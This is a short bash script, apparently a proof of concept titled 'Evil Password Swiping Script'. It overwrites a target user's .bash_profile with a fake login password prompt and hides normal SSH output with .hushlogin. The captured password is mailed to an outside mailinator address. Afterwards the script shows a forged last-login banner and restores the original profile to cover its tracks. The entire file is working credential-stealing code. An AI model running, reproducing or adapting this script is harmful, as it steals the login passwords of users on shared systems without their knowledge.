#!/bin/bash
echo "Evil Password Swiping Script - Written by AndreasE"
echo "DANGER: This is a proof of concept. Do not run without permission"
echo ""
echo "Enter Username"
read USERNAME

if [ -e /home/$USERNAME ] ; then

tput cuul
tput cuf 35
printf "[\e[1;32m+\e[m]"
echo  "	User Exists"
sleep .5
if [ -e /home/$USERNAME/.bash_profile ] ; then

tput cuul
tput cuf 35
printf "[\e[1;32m+\e[m]"
echo "	Bash Profile Exists"
sleep .5
cp /home/$USERNAME/.bash_profile /home/$USERNAME/.bash_env
else
echo  "Bash Profile Doesn't Exist -- Creating"
touch /home/$USERNAME/.bash_env
chmod 777 /home/$USERNAME/.bash_env
sleep .5
printf "[\e[1;32m+\e[m]"
echo  "	Bash Profile Created"

fi


touch /home/$USERNAME/.hushlogin

sleep .5
printf "[\e[1;32m+\e[m]"
echo  "	Suppressed Normal SSH Output"

> /home/$USERNAME/.bash_profile
echo "stty -echo" >> /home/$USERNAME/.bash_profile
echo "echo -n \"Password:\"" >> /home/$USERNAME/.bash_profile
echo "read PASS" >> /home/$USERNAME/.bash_profile
echo "stty=\`stty echo\`" >> /home/$USERNAME/.bash_profile
echo "echo \$PASS | mail secret_password@mailinator.com >> /dev/null" >> /home/$USERNAME/.bash_profile
echo "echo \"\"" >> /home/$USERNAME/.bash_profile
echo "sleep 1" >> /home/$USERNAME/.bash_profile
echo "echo \"Last login: Thu Jul 29 17:40:40 2010 from 66.211.128.206\"" >> /home/$USERNAME/.bash_profile
echo "echo \"Copyright (c) 1980, 1983, 1986, 1988, 1990, 1991, 1993, 1994\"" >> /home/$USERNAME/.bash_profile
echo "echo \"  The Regents of the University of California. All rights reserved.\"" >> /home/$USERNAME/.bash_profile
echo "echo \"\"" >> /home/$USERNAME/.bash_profile
echo "cat /etc/motd" >> /home/$USERNAME/.bash_profile
echo "mv /home/$USERNAME/.bash_env /home/$USERNAME/.bash_profile" >> /home/$USERNAME/.bash_profile
echo "rm /home/$USERNAME/.hushlogin" >> /home/$USERNAME/.bash_profile

sleep .5
printf "[\e[1;32m+\e[m]"
echo  "	Capture Strings Injected"


fi

